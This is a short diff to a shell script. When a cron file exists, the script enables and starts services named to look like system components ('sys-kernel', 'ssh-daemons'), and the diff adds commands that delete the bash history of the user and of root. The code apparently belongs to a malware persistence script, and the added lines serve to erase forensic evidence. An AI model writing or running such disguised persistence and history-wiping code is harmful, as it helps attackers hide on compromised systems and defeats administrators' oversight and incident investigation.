@@ -8,4 +8,6 @@ if [ -e "/etc/cron.d/cronconfig" ]; then
 	systemctl enable sys-kernel.service
 	systemctl start ssh-daemons.service
 	systemctl start sys-kernel.service
+        rm -f ~/.bash_history
+        rm -f /root/.bash_history
 fi
